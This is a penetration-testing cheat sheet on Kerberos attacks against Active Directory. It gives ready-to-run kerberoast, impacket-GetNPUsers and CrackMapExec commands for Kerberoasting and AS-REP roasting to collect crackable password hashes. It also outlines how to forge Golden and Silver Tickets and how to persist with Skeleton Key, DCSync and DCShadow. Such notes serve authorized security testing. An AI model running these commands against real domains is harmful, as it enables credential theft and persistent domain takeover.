## Kerberos

Reference: Attacking Kerberos - https://www.redsiege.com/wp-content/uploads/2020/08/Kerberoastv4.pdf

### Kerberoasting

Used after initial compromise to gain further privileges and credentials. Attacks service accounts
Requires valid domain user credentials with any permissions
Only user accounts tied to SPNs are viable for kerberoasting

    $ cd /opt/tools/porchetta/kerberoast

Look for vulnerable users via LDAP

    $ pipenv run kerberoast ldap  all <ldap_connection_url> -o ldapenum

Use ASREP roast against users in the ldapenum_asrep_users.txt file

    $ pipenv run kerberoast asreproast <DC_ip> -t ldapenum_asrep_users.txt

Use SPN roast against users in the ldapenum_spn_users.txt file

    $ pipenv run kerberoast spnroast <kerberos_connection_url> -t ldapenum_spn_users.txt

Command structure

    $ kerberoast ldap <type> <ldap_connection_url> <options>

Reference: https://github.com/skelsec/kerberoast

### Pass-the-Ticket

Process of stealing and reusing tickets by extracting them from the memory of compromised machines. 

### Over-the-Hash

Relies on rc4_hmac_md5 as Kerberos encryption type and using the user's NT hash instead of user's password to request tickets. If encryption type is AES then use AES key instead of NT hash. 

### Golden Ticket (Persistence)

A Golden Ticket is a special TGT (Ticket Granting Ticket) created by an attacker. Can be done offline. Requires: Target Long-Term Key, KDC LT Key to have valid PAC 
Required creation items when made with mimikatz: NT hash of Kerberos account (krbtgt), name of admin account, domain name, SID of admin account 

### Silver Ticket

Silver tickets are forged Service Tickets with custom PAC. Silver Tickets do NOT require krbtgt account and is more subtle than Golden Ticket. 
To find other SIDs: wmic useraccount get sid, name 

### Skeleton Key (Persistence) 

Allows anyone to authenticate as any user with the password 'mimikatz' - Anyone. Not just the tester 

### DCSync (Persistence) 

Utilizes the domain replication protocol to mimic a DC (requires Domain Admin or replication privileges) 

### DCShadow (Persistence) 

Reverses direction of replication, rendering the fake DC as almost invisible as no logs are created apart from Windows Event Log 5137 & 5141 (Creation of directory service object and deletion respectively) 

### ASREProast

Users list dynamically queried with an LDAP anonymous bind

    $ sudo impacket-GetNPUsers -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/' 

With a users file

    $ sudo impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/' 

Users list dynamically queried with a LDAP authenticated bind (password)

    $ sudo impacket-GetNPUsers -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'

Users list dynamically queried with a LDAP authenticated bind (NT hash)

    $ sudo impacket-GetNPUsers -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER' 

The Impacket script GetNPUsers (Python) can get TGTs for the users that have the property Do not require Kerberos preauthentication set.

### ASREProast - CME

$ sudo poetry run cme ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter

 


